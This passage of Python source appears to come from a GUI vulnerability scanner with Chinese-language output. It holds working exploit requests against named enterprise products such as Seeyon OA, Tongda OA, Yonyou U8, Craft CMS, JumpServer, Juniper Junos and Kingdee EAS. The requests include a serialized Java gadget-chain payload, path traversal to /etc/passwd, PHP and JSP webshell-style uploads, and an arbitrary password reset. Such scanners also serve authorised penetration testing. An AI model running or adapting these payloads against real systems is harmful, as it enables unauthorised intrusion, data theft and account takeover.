                        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                        'Connection': 'close',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Accept-Encoding': 'gzip, deflate',
                        'cmd': '@@@@@echo Test',
                    }

                    data = '''{{base64dec(rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZHQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lNZXRob2RxAH4ACnhyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAACnQAGVJGOkpNb2RlbFJlc3VsdHQAG0xqYXZhL2xhbmcvU3RyaW5nO3hwc3EAfgAKc3IAJm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnlUiqsSmzlVCAIAAUwAA21hcHQAQkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAFGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwc3EAfgAJeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJUcmFuc2Zvcm1lcrN5Y+2Zs1QDAAB4cHcEAAAAAHg='''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and "Test" in res:
                            self.append_to_output(f"[+] {url} 存在致远OA_M1Server_userTokenService远程命令执行漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在致远OA_M1Server_userTokenService远程命令执行漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "79.光伏发电测量系统目录遍历漏洞(CVE-2023-40924)":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                    }
                    if url.endswith("/"):
                        path = "downloader.php?file=../../../../../../../../etc/passwd%00.jpg"
                    else:
                        path = "/downloader.php?file=../../../../../../../../etc/passwd%00.jpg"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and 'Error 404' not in res:
                            self.append_to_output(f"[+] {url} 存在光伏发电测量系统目录遍历漏洞！！！！", "red")
                            # self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在光伏发电测量系统目录遍历漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "81.JumpServer Session 未授权访问漏洞(CVE-2023-42442)":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "api/v1/terminal/sessions/"
                    else:
                        path = "/api/v1/terminal/sessions/"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                        }

                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'id' in res:
                            self.append_to_output(f"[+] {url} 存在JumpServer Session 未授权访问漏洞(CVE-2023-42442)！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res[0:100]} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在JumpServer Session 未授权访问漏洞(CVE-2023-42442)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "82.通达OA v2017 action_upload.php 任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "module/ueditor/php/action_upload.php?action=uploadfile"
                    else:
                        path = "/module/ueditor/php/action_upload.php?action=uploadfile"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                        "Content-Type": "multipart/form-data; boundary= ----WebKitFormBoundaryxzUhGld6cusN3Alk",
                    }

                    data = '''-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="CONFIG[fileFieldName]"\r\n\r\nffff\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="CONFIG[fileMaxSize]"\r\n\r\n1000000000\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="CONFIG[filePathFormat]"\r\n\r\ntcmd\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="CONFIG[fileAllowFiles][]"\r\n\r\n.php\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="ffff"; filename="test.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php phpinfo();?>\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="mufile"\r\n\r\nsubmit\r\n-----------------------------55719851240137822763221368724--'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200:
                            if url.endswith("/"):
                                path = "tcmd.php"
                            else:
                                path = "/tcmd.php"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url_res = 'http://' + url
                            else:
                                url_res = url
                            encoderes = url_res + path
                            try:
                                # requests.packages.urllib3.disable_warnings()
                                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                                req = requests.get(encoderes, headers=headers, verify=False, timeout=15, proxies=proxies)
                                res = req.text
                                if req.status_code == 200:
                                    self.append_to_output(f"[+] {url} 存在通达OA v2017 action_upload.php 任意文件上传漏洞！！！！", "red")
                                    # self.append_to_output(res, "yellow")
                                    self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                                else:
                                    self.append_to_output(f"[-] {url} 不存在通达OA v2017 action_upload.php 任意文件上传漏洞", "green")
                            except Timeout:
                                self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                            except Exception as e:
                                self.append_to_output(str(e), "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在通达OA v2017 action_upload.php 任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "83.Craft CMS 远程代码执行漏洞(CVE-2023-41892)":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "index.php"
                    else:
                        path = "/index.php"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close",
                    }

                    data = r'''action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()

                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, verify=False, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'Build System' in res:
                            self.append_to_output(f"[+] {url} 存在Craft CMS 远程代码执行漏洞(CVE-2023-41892)！！！！", "red")
                            # self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Craft CMS 远程代码执行漏洞(CVE-2023-41892)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "84.用友U8 crm客户关系管理存在任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "ajax/getemaildata.php?DontCheckLogin=1"
                    else:
                        path = "/ajax/getemaildata.php?DontCheckLogin=1"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ",
                    }

                    data = '''------WebKitFormBoundarykS5RKgl8t3nwInMQ\r\nContent-Disposition: form-data; name="file"; filename="ceshi.php "\r\nContent-Type: text/plain\r\n\r\n<?php echo md5(1234);?>\r\n\r\n------WebKitFormBoundarykS5RKgl8t3nwInMQ'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'filePath' in res:
                            self.append_to_output(f"[+] {url} 可能存在用友U8 crm客户关系管理存在任意文件上传漏洞！！！！", "red")
                            # self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                            data = json.loads(res)
                            # 获取 filePath 中的文件名
                            file_path = data["filePath"]
                            file_name = file_path.split("\\")[-1]
                            # 从文件名中提取 "9B50"
                            file_name_without_extension = file_name.split(".")[0]  # 去掉文件扩展名部分
                            desired_value = file_name_without_extension[3:]  # 获取 "9B50" 部分
                            # 将 "9B50" 转换为16进制并减1
                            desired_hex_value = hex(int(desired_value, 16) - 1)[2:]  # 转换为16进制，并去掉前缀"0x"

                            # 构建UDP地址
                            udp_address = "upd" + desired_hex_value

                            # 添加 ".tmp.php" 扩展名
                            final_filename = udp_address + ".tmp.php"
                            self.append_to_output(f"[+] 重组后的文件名: {final_filename} ", "red")

                            if url.endswith("/"):
                                path = "tmpfile/"
                            else:
                                path = "/tmpfile/"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url_res = 'http://' + url
                            else:
                                url_res = url
                            encoderes = url_res + path + final_filename
                            headers = {
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                                "Accept": "*/*",
                                "Accept-Encoding": "gzip, deflate",
                                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                                "Connection": "close",
                            }
                            try:
                                # requests.packages.urllib3.disable_warnings()
                                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                                req = requests.get(encoderes, headers=headers, verify=False, timeout=15, proxies=proxies)
                                res = req.text
                                if req.status_code == 200 and '81dc9bdb52' in res:
                                    self.append_to_output(f"[+] {url} 确认无误，得到了我们想要的md5值！！！！", "red")
                                    # self.append_to_output(res, "yellow")
                                    self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                                else:
                                    self.append_to_output(f"[-] {url} 不存在用友U8 crm客户关系管理存在任意文件上传漏洞", "green")
                            except Timeout:
                                self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                            except Exception as e:
                                self.append_to_output(str(e), "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在用友U8 crm客户关系管理存在任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "85.万户ezOFFICE存在未授权访问漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "defaultroot/evoInterfaceServlet?paramType=user"
                    else:
                        path = "/defaultroot/evoInterfaceServlet?paramType=user"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                        }

                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'data' in res:
                            self.append_to_output(f"[+] {url} 存在万户ezOFFICE存在未授权访问漏洞！！！！", "red")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在万户ezOFFICE存在未授权访问漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "86.用友移动管理系统存在任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "maportal/appmanager/uploadApk.dopk_obj="
                    else:
                        path = "/maportal/appmanager/uploadApk.dopk_obj="

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "close",
                        "Content-Type": "application/x-www-form-urlencoded",
                    }

                    data = '''--fa48ebfef59b133a8cd5275661b35d2c\r\nContent-Disposition: form-data; name="downloadpath"; filename="59209.jsp"\r\nContent-Type: application/msword\r\n\r\n082863327\r\n--fa48ebfef59b133a8cd5275661b35d2c--'''
                    self.append_to_output("===================================================================", "green")
                    try:
                        # requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and '{"status":2}' in res:
                            self.append_to_output(f"[+] {url} 存在用友用友移动管理系统存在任意文件上传漏洞！！！！", "yellow")
                            # self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")

                            if url.endswith("/"):
                                path = "maupload/apk/59209.jsp"
                            else:
                                path = "/maupload/apk/59209.jsp"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url_res = 'http://' + url
                            else:
                                url_res = url
                            encoderes = url_res + path
                            headers = {
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                                "Accept": "*/*",
                                "Accept-Encoding": "gzip, deflate",
                                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                                "Connection": "close",
                            }
                            try:
                                # requests.packages.urllib3.disable_warnings()
                                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                                req = requests.get(encoderes, headers=headers, verify=False, timeout=15, proxies=proxies)
                                res = req.text
                                if req.status_code == 200 and '082863327' in res:
                                    self.append_to_output(f"[+] {url} 确认无误，得到了我们想要的值！！！！", "yellow")
                                    # self.append_to_output(res, "yellow")
                                    self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                                else:
                                    self.append_to_output(f"[-] {url} 不存在用友用友移动管理系统存在任意文件上传漏洞", "green")
                            except Timeout:
                                self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                            except Exception as e:
                                self.append_to_output(str(e), "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在用友用友移动管理系统存在任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "87.致远OA resetPassword任意用户密码修改漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "seeyon/rest/phoneLogin/phoneCode/resetPassword"
                    else:
                        path = "/seeyon/rest/phoneLogin/phoneCode/resetPassword"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                    }

                    data = '''{"loginName":"liqiang","password":"123456"}'''
                    self.append_to_output("===================================================================", "green")
                    try:
                        # requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'succuss' in res:
                            self.append_to_output(f"[+] {url} 存在致远OA resetPassword任意用户密码修改漏洞！！！！", "yellow")
                            # self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在致远OA resetPassword任意用户密码修改漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "88.Juniper Networks Junos OS EX远程命令执行漏洞(CVE-2023-36845)":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "?PHPRC=/dev/fd/0"
                    else:
                        path = "/?PHPRC=/dev/fd/0"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Upgrade-Insecure-Requests":"1",
                        "Sec-Ch-Ua-Mobile": "?0",
                        "Sec-Ch-Ua": '"-Not.A/Brand";v="8", "Chromium";v="102"',
                        }

                    data = '''auto_prepend_file="/etc/passwd"'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=15, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'root' in res:
                            self.append_to_output(f"[+] {url} 存在Juniper Networks Junos OS EX远程命令执行漏洞(CVE-2023-36845)！！！！", "red")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Juniper Networks Junos OS EX远程命令执行漏洞(CVE-2023-36845)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "89.华测监测预警系统 2.2 存在任意文件读取漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "Handler/FileDownLoad.ashx"
                    else:
                        path = "/Handler/FileDownLoad.ashx"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "Keep-Alive",
                        "Content-Type": "application/x-www-form-urlencoded",
                        }

                    data = '''filename=1&filepath=..%2F..%2Fweb.config'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.get(encodetext, data=data, headers=headers, verify=False, timeout=15, proxies=proxies)
                        res = req.text

                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在华测监测预警系统 2.2 存在任意文件读取漏洞！！！！", "red")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在华测监测预警系统 2.2 存在任意文件读取漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "90.金蝶EAS、EAS Cloud远程代码执行漏洞":
                    if url.endswith("/"):
                        path = "easportal/buffalo/../cm/myUploadFile.do"
                    else:
                        path = "/easportal/buffalo/../cm/myUploadFile.do"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    base_url = url + path

                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
                        "Connection": "close",
                        "Accept": "*/*",
                        "Accept-Language": "en",
                        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx",
                        "Cookie": "sl-session=sqPhC9MLJmWsiN7c9/P6tA==",
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Length": "210",
                        "SL-CE-SUID": "47"
                    }
                    data = '''------WebKitFormBoundarySq4lDnabv8CwHfvx\r\nContent-Disposition: form-data; name="myFile";\r\nfilename="/xiao.jsp"\r\nContent-Type: text/html\r\n\r\n<%out.println("test123");%>\r\n------WebKitFormBoundarySq4lDnabv8CwHfvx--'''

                    self.append_to_output("===================================================================","green")
                    try:
                        # 创建不验证SSL证书的HTTPSHandler
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE

                        timeout_seconds = 10  # 设置超时时间（单位：秒）
                        # 创建 HTTPSHandler
                        https_handler = urllib.request.HTTPSHandler(context=context)

                        # 设置 Burp 代理
                        proxy_handler = urllib.request.ProxyHandler(
                            {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})

                        # 构建 Opener 并添加 HTTPSHandler
                        opener = urllib.request.build_opener(https_handler, proxy_handler)

                        # 构建请求对象
                        request = urllib.request.Request(base_url, data=data.encode('utf-8'), headers=headers)

                        # 发送 POST 请求
                        response = opener.open(request, timeout=timeout_seconds)
                        result = str(response.read())
                        if response.getcode() == 200:
                            self.append_to_output(f"[+] {url} 可能存在金蝶EAS、EAS Cloud远程代码执行漏洞！！！！", "yellow")
                            if url.endswith("/"):
                                path = "easportal/buffalo/../xiao.jsp"
                            else:
                                path = "/easportal/buffalo/../xiao.jsp"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url = 'http://' + url

                            encodetext = url + path
                            # 设置Burp代理
                            proxy_handler = urllib.request.ProxyHandler(
                                {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
                            # 构建Opener
                            opener = urllib.request.build_opener(proxy_handler)
                            # 构建请求对象
                            request = urllib.request.Request(encodetext)
                            # 发送POST请求
                            response = opener.open(request)
                            result = str(response.read())
                            if response.getcode() == 200 and 'test123' in result:
                                self.append_to_output(f"[+] 存在金蝶EAS、EAS Cloud远程代码执行漏洞！！！！", "red")
                                self.append_to_output(result, "yellow")
                                with open("output.txt", "a") as file:
                                    file.write(f"[+] {url} 存在金蝶EAS、EAS Cloud远程代码执行漏洞！！！！" + "\n")
                                    file.write(result + "\n")
                            else:
                                self.append_to_output(f"[-] {url} 不存在金蝶EAS、EAS Cloud远程代码执行漏洞", "green")
                        else:
                            self.append_to_output(f"[-] {url} 不存在金蝶EAS、EAS Cloud远程代码执行漏洞", "green")
                    except Timeout :
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'timed out' in str(e):
                            self.append_to_output("请求超时，执行下一个URL测试", "yellow")
                        if '404' in str(e):
                            self.append_to_output("请求响应内容不存在，执行下一个URL测试", "yellow")
                        if '405' in str(e):
                            self.append_to_output("请求被拒绝，可能存在防火墙，执行下一个URL测试", "yellow")
                        if '403' in str(e):
                            self.append_to_output("你的IP被列入黑名单，执行下一个URL测试", "yellow")
                        if 'SSL' in str(e):
                            self.append_to_output("你的证书不被允许，执行下一个URL测试", "yellow")
                        if '500' in str(e):
                            self.append_to_output("服务器内部出现错误，执行下一个URL测试", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
    def stop_detection(self):
        self.stop_detection_flag = True

    def append_to_output(self, text, tag=None):
        self.output_text.config(state=tk.NORMAL)
        if tag:
